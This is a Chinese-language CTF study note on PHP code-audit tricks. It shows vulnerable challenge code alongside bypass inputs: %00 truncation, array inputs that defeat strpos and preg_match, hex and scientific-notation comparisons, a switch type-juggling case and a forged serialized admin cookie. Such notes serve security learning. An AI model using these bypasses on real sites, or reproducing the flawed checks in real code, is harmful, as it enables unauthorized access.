## strpos数组绕过NULL与ereg正则%00截断

方法一:%00截断
注意点:需将#编码
[![image.png](https://sakurahack-y.github.io/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664856729744-a800de1d-40cc-498f-bef1-af960c8429dd.png)](https://sakurahack-y.github.io/2022/11/22/php代码审计总结/1664856729744-a800de1d-40cc-498f-bef1-af960c8429dd.png)

方法二:数组绕过
直接传入一个数组
既要是纯数字,又要有’#biubiubiu’，strpos()找的是字符串,那么传一个数组给它,strpos()出错返回null,null!==false,所以符合要求. 所以输入nctf[]= 那为什么ereg()也能符合呢?因为ereg()在出错时返回的也是null,null!==false,所以符合要求.
[![image.png](https://sakurahack-y.github.io/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664856872643-ee08f73b-d6b9-45d2-bf2b-3123fa02afa1.png)](https://sakurahack-y.github.io/2022/11/22/php代码审计总结/1664856872643-ee08f73b-d6b9-45d2-bf2b-3123fa02afa1.png)

## **十六进制与数字比较**

```
<?php

error_reporting(0);
function noother_says_correct($temp)
{
    $flag = 'flag{test}';
    $one = ord('1');  //ord — 返回字符的 ASCII 码值
    $nine = ord('9'); //ord — 返回字符的 ASCII 码值
    $number = '3735929054';
    // Check all the input characters!
    for ($i = 0; $i < strlen($number); $i++)
    { 
        // Disallow all the digits!
        $digit = ord($temp{$i});
        if ( ($digit >= $one) && ($digit <= $nine) )
        {
            // Aha, digit not allowed!
            return "flase";
        }
    }
    if($number == $temp)
        return $flag;
}
$temp = $_GET['password'];
echo noother_says_correct($temp);

?>
```

这里，它不让输入1到9的数字，但是后面却让比较一串数字
在php里面，0x开头则表示16进制，将这串数字转换成16进制之后发现，是deadc0de
[![image.png](https://sakurahack-y.github.io/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664872563600-ed999410-6755-4b2a-be29-7d799a66485a.png)](https://sakurahack-y.github.io/2022/11/22/php代码审计总结/1664872563600-ed999410-6755-4b2a-be29-7d799a66485a.png)
在开头加上0x，代表这个是16进制的数字，然后再和十进制的 3735929054比较，答案当然是相同的，返回true拿到flag
[![image.png](https://sakurahack-y.github.io/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664872687987-b73ff2a8-2ee9-49e6-92b9-9fa66c50e642.png)](https://sakurahack-y.github.io/2022/11/22/php代码审计总结/1664872687987-b73ff2a8-2ee9-49e6-92b9-9fa66c50e642.png)

## **数字验证正则绕过**

```
<?php

error_reporting(0);
$flag = 'flag{test}';
if  ("POST" == $_SERVER['REQUEST_METHOD']) 
{ 
    $password = $_POST['password']; 
    if (0 >= preg_match('/^[[:graph:]]{12,}$/', $password)) //preg_match — 执行一个正则表达式匹配
    { 
        echo 'Wrong Format'; 
        exit; 
    } 
    while (TRUE) 
    { 
        $reg = '/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/'; 
        if (6 > preg_match_all($reg, $password, $arr)) 
            break; 
        $c = 0; 
        $ps = array('punct', 'digit', 'upper', 'lower'); //[[:punct:]] 任何标点符号 [[:digit:]] 任何数字  [[:upper:]] 任何大写字母  [[:lower:]] 任何小写字母 
        foreach ($ps as $pt) 
        { 
            if (preg_match("/[[:$pt:]]+/", $password)) 
                $c += 1; 
        } 
        if ($c < 3) break; 
        //>=3，必须包含四种类型三种与三种以上
        if ("42" == $password) echo $flag; 
        else echo 'Wrong password'; 
        exit; 
    } 
}

?>
```

意为必须是12个字符以上（非空格非TAB之外的内容）
[![image.png](https://sakurahack-y.github.io/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664878820196-cd2ab7eb-c079-4f8b-8eb4-1a4746b183f2.png)](https://sakurahack-y.github.io/2022/11/22/php代码审计总结/1664878820196-cd2ab7eb-c079-4f8b-8eb4-1a4746b183f2.png)
意为匹配到的次数要大于6次
[![image.png](https://sakurahack-y.github.io/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664878914886-87653c10-7d3d-4369-8e09-1779ffeda157.png)](https://sakurahack-y.github.io/2022/11/22/php代码审计总结/1664878914886-87653c10-7d3d-4369-8e09-1779ffeda157.png)
意为必须要有大小写字母，数字，字符内容三种与三种以上
[![image.png](https://sakurahack-y.github.io/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664878981551-c67275d3-8869-4f35-9a40-f5f2b855c653.png)](https://sakurahack-y.github.io/2022/11/22/php代码审计总结/1664878981551-c67275d3-8869-4f35-9a40-f5f2b855c653.png)
传入值 必须等于42
[![image.png](https://sakurahack-y.github.io/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664879091286-6802d5a4-2753-4d70-aae0-ea2e9f48e862.png)](https://sakurahack-y.github.io/2022/11/22/php代码审计总结/1664879091286-6802d5a4-2753-4d70-aae0-ea2e9f48e862.png)
可构造payload:

```
42.00e+00000000000 
或
420.000000000e-1
```

## **switch没有break 字符与0比较绕过**

首先我们来回顾下switch语句:
[![image.png](https://sakurahack-y.github.io/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664880863864-69ee9b4d-f83f-4999-94de-684c5fa6433f.png)](https://sakurahack-y.github.io/2022/11/22/php代码审计总结/1664880863864-69ee9b4d-f83f-4999-94de-684c5fa6433f.png)
[![image.png](https://sakurahack-y.github.io/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664880871606-a49b0ffd-3cd2-4ab2-a99b-1e498624758e.png)](https://sakurahack-y.github.io/2022/11/22/php代码审计总结/1664880871606-a49b0ffd-3cd2-4ab2-a99b-1e498624758e.png)
匹配到了2，然后2及其2后面的语句都会执行，且不会再进行匹配。
那我们接下来看这个题目:

```
<?php

error_reporting(0);

if (isset($_GET['which']))
{
    $which = $_GET['which'];
    switch ($which)
    {
    case 0:
    case 1:
    case 2:
        require_once $which.'.php';
         echo $flag;
        break;
    default:
        echo GWF_HTML::error('PHP-0817', 'Hacker NoNoNo!', false);
        break;
    }
}

?>
```

直接传入test
[![image.png](https://sakurahack-y.github.io/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664881120398-f8cbf511-b917-4d02-a540-dc4640c33082.png)](https://sakurahack-y.github.io/2022/11/22/php代码审计总结/1664881120398-f8cbf511-b917-4d02-a540-dc4640c33082.png)
因为当一个字符串与数字比较时，会将字符串转换为数字,传入test后就与0匹配，就不会继续进行匹配了。

## 利用提交数组绕过逻辑

```
<?php 
$role = "guest";
$flag = "flag{test_flag}";
$auth = false;
if(isset($_COOKIE["role"])){
    $role = unserialize(base64_decode($_COOKIE["role"]));
    if($role === "admin"){
        $auth = true;
    }
    else{
        $auth = false;
    }
}
else{
    $role = base64_encode(serialize($role));
    setcookie('role',$role);
}
if($auth){
    if(isset($_POST['filename'])){
        $filename = $_POST['filename'];
        $data = $_POST['data'];
        if(preg_match('[<>?]', $data)) {
            die('No No No!'.$data);
        }
        else {
            $s = implode($data);
            if(!preg_match('[<>?]', $s)){
                $flag='None.';
            }
            $rand = rand(1,10000000);
            $tmp="./uploads/".md5(time() + $rand).$filename;
            file_put_contents($tmp, $flag);
            echo "your file is in " . $tmp;
        }
    }
    else{
        echo "Hello admin, now you can upload something you are easy to forget.";
        echo "
there are the source.
";
        echo '<textarea rows="10" cols="100">';
        echo htmlspecialchars(str_replace($flag,'flag{???}',file_get_contents(__FILE__)));
        echo '</textarea>';
    }
}
else{
    echo "Sorry. You have no permissions.";
}
?>
```

访问页面
[![image.png](https://sakurahack-y.github.io/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664882469000-0dd64e6a-ce6b-4b80-8ab9-974ed08e5a16.png)](https://sakurahack-y.github.io/2022/11/22/php代码审计总结/1664882469000-0dd64e6a-ce6b-4b80-8ab9-974ed08e5a16.png)
首先将cookie的用户修改为admin，并替换
[![image.png](https://sakurahack-y.github.io/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664882512840-8c8d4853-af5c-4dac-a0bf-8c9a1e0d6076.png)](https://sakurahack-y.github.io/2022/11/22/php代码审计总结/1664882512840-8c8d4853-af5c-4dac-a0bf-8c9a1e0d6076.png)
然后再次访问，获得题目源码
[![image.png](https://sakurahack-y.github.io/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664882543396-6c93429c-9f67-486a-b93c-3eaadd79a6b9.png)](https://sakurahack-y.github.io/2022/11/22/php代码审计总结/1664882543396-6c93429c-9f67-486a-b93c-3eaadd79a6b9.png)

[![30_1.png](https://sakurahack-y.github.io/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664882956551-bc37572d-7354-434b-a73c-c6c77ce88bea.png)](https://sakurahack-y.github.io/2022/11/22/php代码审计总结/1664882956551-bc37572d-7354-434b-a73c-c6c77ce88bea.png)
preg_match只能处理字符串，当传入的subject是数组时会返回false
想要通过Post请求的形式传入数组可以使用 data[0]=123&data[1]=<> 的形式传入数组，这样的话在执行 implode() 函数的时候就不会使 &s 为空，成功绕过这段逻辑拿到flag。
[![30_2.png](https://sakurahack-y.github.io/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664882977530-c17d78ee-94a5-482a-b426-04536aece637.png)](https://sakurahack-y.github.io/2022/11/22/php代码审计总结/1664882977530-c17d78ee-94a5-482a-b426-04536aece637.png)

---

## 相关资源

- **靶场WP**: [ctfshow-php特性WP](WP汇总/ctfshow-php特性.md) | [代码审计WP](WP汇总/代码审计/README.md)
- **脚本**: [md5爆破脚本](CTF常用脚本及工具/md5爆破/) — 配合 L228-L277 哈希碰撞章节
- **相关文章**:
  - [SQL.md](SQL.md) — SQL注入 WITH ROLLUP 绕过结合弱类型
  - [命令执行.md](命令执行.md) — preg_match绕过可致RCE
  - [文件包含.md](文件包含.md) — include截断 (%00/?/#)
  - [文件上传漏洞.md](文件上传漏洞.md) — move_uploaded_file %00截断
  - [PHP反序列化漏洞总结.md](PHP反序列化漏洞总结.md) — 魔术方法审计